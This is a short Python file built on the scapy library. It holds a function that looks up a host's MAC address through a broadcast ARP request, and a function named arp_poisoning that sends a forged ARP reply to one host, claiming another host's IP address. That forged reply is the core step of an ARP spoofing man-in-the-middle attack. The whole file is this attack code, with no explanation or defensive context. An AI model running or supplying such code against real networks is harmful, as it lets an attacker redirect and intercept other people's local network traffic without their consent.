import scapy.all as scapy


def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packets = broadcast_packet / arp_request
    answered = scapy.srp(combined_packets, timeout=1)[0]
    return answered[0][1].hwsrc


def arp_poisoning(ip1, ip2):
    target_mac = get_mac_address(ip1)
    arp_response = scapy.ARP(op=2, pdst=ip1, hwdst=target_mac, psrc=ip2)
    scapy.send(arp_response)

